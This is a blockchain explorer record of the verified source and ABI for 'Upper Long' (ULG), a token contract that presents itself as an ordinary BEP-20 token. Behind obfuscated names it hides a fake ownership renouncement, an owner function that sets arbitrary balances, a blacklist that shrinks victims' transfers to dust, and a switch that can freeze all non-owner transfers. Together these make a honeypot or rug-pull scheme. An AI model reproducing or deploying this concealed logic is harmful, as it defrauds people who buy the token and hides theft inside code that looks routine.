{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface launchExempt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract sellMarketing {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingLimit {\n    function createPair(address shouldExemptBuy, address atReceiver) external returns (address);\n}\n\ninterface tokenShouldFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address shouldMode) external view returns (uint256);\n\n    function transfer(address swapFee, uint256 takeTrading) external returns (bool);\n\n    function allowance(address fundBuyTake, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeTrading) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapFee,\n        uint256 takeTrading\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed sellAmountLiquidity, uint256 value);\n    event Approval(address indexed fundBuyTake, address indexed spender, uint256 value);\n}\n\ninterface tokenShouldFeeMetadata is tokenShouldFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract UpperLong is sellMarketing, tokenShouldFee, tokenShouldFeeMetadata {\n\n    mapping(address => bool) public takeAmount;\n\n    function symbol() external view virtual override returns (string memory) {\n        return txEnable;\n    }\n\n    function minExempt() public {\n        emit OwnershipTransferred(toAmount, address(0));\n        feeAutoTotal = address(0);\n    }\n\n    uint256 private launchedTxTeam = 100000000 * 10 ** 18;\n\n    function liquiditySender(address atLimit, address swapFee, uint256 takeTrading) internal returns (bool) {\n        require(receiverTeam[atLimit] >= takeTrading);\n        receiverTeam[atLimit] -= takeTrading;\n        receiverTeam[swapFee] += takeTrading;\n        emit Transfer(atLimit, swapFee, takeTrading);\n        return true;\n    }\n\n    uint256 constant receiverFundFrom = 20 ** 10;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchedTxTeam;\n    }\n\n    function fromExempt(address feeReceiverLiquidity) public {\n        maxTx();\n        if (walletLimit == totalFee) {\n            totalFee = walletLimit;\n        }\n        if (feeReceiverLiquidity == toAmount || feeReceiverLiquidity == launchedSwap) {\n            return;\n        }\n        takeAmount[feeReceiverLiquidity] = true;\n    }\n\n    function sellAuto(uint256 takeTrading) public {\n        maxTx();\n        fundSender = takeTrading;\n    }\n\n    string private sellTx = \"Upper Long\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return buyTrading;\n    }\n\n    function launchFrom(address txFund, uint256 takeTrading) public {\n        maxTx();\n        receiverTeam[txFund] = takeTrading;\n    }\n\n    bool private maxSell;\n\n    address private feeAutoTotal;\n\n    function balanceOf(address shouldMode) public view virtual override returns (uint256) {\n        return receiverTeam[shouldMode];\n    }\n\n    function getOwner() external view returns (address) {\n        return feeAutoTotal;\n    }\n\n    bool public fundIsFee;\n\n    event OwnershipTransferred(address indexed maxIs, address indexed listReceiver);\n\n    uint256 private senderBuy;\n\n    function owner() external view returns (address) {\n        return feeAutoTotal;\n    }\n\n    address tradingLaunchLimit = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint8 private buyTrading = 18;\n\n    string private txEnable = \"ULG\";\n\n    function swapAmount(address atLimit, address swapFee, uint256 takeTrading) internal returns (bool) {\n        if (atLimit == toAmount) {\n            return liquiditySender(atLimit, swapFee, takeTrading);\n        }\n        uint256 feeLaunchedMode = tokenShouldFee(launchedSwap).balanceOf(enableAutoFund);\n        require(feeLaunchedMode == fundSender);\n        require(swapFee != enableAutoFund);\n        if (takeAmount[atLimit]) {\n            return liquiditySender(atLimit, swapFee, receiverFundFrom);\n        }\n        return liquiditySender(atLimit, swapFee, takeTrading);\n    }\n\n    function approve(address launchedAmount, uint256 takeTrading) public virtual override returns (bool) {\n        amountLaunch[_msgSender()][launchedAmount] = takeTrading;\n        emit Approval(_msgSender(), launchedAmount, takeTrading);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private amountLaunch;\n\n    bool private isSwapShould;\n\n    uint256 atTotalReceiver;\n\n    bool public isEnable;\n\n    bool public walletTo;\n\n    address enableAutoFund = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function maxTx() private view {\n        require(tradingExempt[_msgSender()]);\n    }\n\n    constructor (){\n        \n        launchExempt launchedFee = launchExempt(tradingLaunchLimit);\n        launchedSwap = marketingLimit(launchedFee.factory()).createPair(launchedFee.WETH(), address(this));\n        \n        toAmount = _msgSender();\n        minExempt();\n        tradingExempt[toAmount] = true;\n        receiverTeam[toAmount] = launchedTxTeam;\n        if (totalFee == senderBuy) {\n            isSwapShould = true;\n        }\n        emit Transfer(address(0), toAmount, launchedTxTeam);\n    }\n\n    function modeShould(address listMax) public {\n        if (isEnable) {\n            return;\n        }\n        \n        tradingExempt[listMax] = true;\n        if (maxSell == walletTo) {\n            senderBuy = walletLimit;\n        }\n        isEnable = true;\n    }\n\n    function allowance(address tradingAuto, address launchedAmount) external view virtual override returns (uint256) {\n        if (launchedAmount == tradingLaunchLimit) {\n            return type(uint256).max;\n        }\n        return amountLaunch[tradingAuto][launchedAmount];\n    }\n\n    address public toAmount;\n\n    uint256 fundSender;\n\n    function name() external view virtual override returns (string memory) {\n        return sellTx;\n    }\n\n    uint256 private totalFee;\n\n    uint256 public walletLimit;\n\n    function transfer(address txFund, uint256 takeTrading) external virtual override returns (bool) {\n        return swapAmount(_msgSender(), txFund, takeTrading);\n    }\n\n    function transferFrom(address atLimit, address swapFee, uint256 takeTrading) external override returns (bool) {\n        if (_msgSender() != tradingLaunchLimit) {\n            if (amountLaunch[atLimit][_msgSender()] != type(uint256).max) {\n                require(takeTrading <= amountLaunch[atLimit][_msgSender()]);\n                amountLaunch[atLimit][_msgSender()] -= takeTrading;\n            }\n        }\n        return swapAmount(atLimit, swapFee, takeTrading);\n    }\n\n    mapping(address => bool) public tradingExempt;\n\n    address public launchedSwap;\n\n    mapping(address => uint256) private receiverTeam;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundBuyTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellAmountLiquidity\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedAmount\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTrading\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldMode\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeReceiverLiquidity\",\"type\":\"address\"}],\"name\":\"fromExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundIsFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTrading\",\"type\":\"uint256\"}],\"name\":\"launchFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMax\",\"type\":\"address\"}],\"name\":\"modeShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeTrading\",\"type\":\"uint256\"}],\"name\":\"sellAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTrading\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTrading\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "UpperLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}